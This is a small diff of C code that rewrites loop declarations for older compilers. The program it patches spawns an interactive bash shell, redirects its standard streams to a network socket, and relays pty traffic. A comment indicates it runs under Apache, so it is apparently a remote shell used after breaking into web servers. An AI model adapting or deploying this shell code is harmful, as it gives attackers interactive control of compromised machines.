@@ -48,7 +48,8 @@ int swap(int sockfd, int master)
 	for(;;)
 	{
 		nfds = epoll_wait(epfd, events, 5, -1);
-		for(int i = 0;i < nfds; i ++)
+		int i;
+		for(i = 0;i < nfds; i ++)
 		{
 			if(events[i].data.fd == sockfd)
 			{
@@ -115,8 +116,9 @@ int main(int argc, char* argv[])
 		execlp("/bin/bash", "-i", NULL);
 
 	//dup2 stdin/stdout/stderr to sockfd, it's will hung executed by apache if not do this step
-	for(int i = 0;i < 3; i ++)
-		dup2(sockfd, i);
+	dup2(sockfd, 0);
+	dup2(sockfd, 1);
+	dup2(sockfd, 2);
 	//parent swap data
 	printf("[%s][PID=%d]\r\n", ptsname, (int) pid);
 	swap(sockfd, master);
